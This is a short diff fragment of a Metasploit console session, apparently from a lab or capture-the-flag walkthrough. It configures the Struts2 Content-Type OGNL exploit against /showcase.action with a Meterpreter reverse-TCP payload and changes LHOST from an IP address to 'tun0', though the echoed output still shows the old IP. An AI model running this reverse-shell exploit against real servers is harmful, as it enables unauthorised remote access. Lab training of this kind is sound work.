@@ -34,7 +34,7 @@ msf6 exploit(multi/http/struts2_content_type_ognl) > set TARGETURI /showcase.act
 TARGETURI => /showcase.action
 msf6 exploit(multi/http/struts2_content_type_ognl) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
 PAYLOAD => linux/x86/meterpreter/reverse_tcp
-msf6 exploit(multi/http/struts2_content_type_ognl) > set LHOST 10.4.32.172
+msf6 exploit(multi/http/struts2_content_type_ognl) > set LHOST tun0
 LHOST => 10.4.32.172
 msf6 exploit(multi/http/struts2_content_type_ognl) > run
 
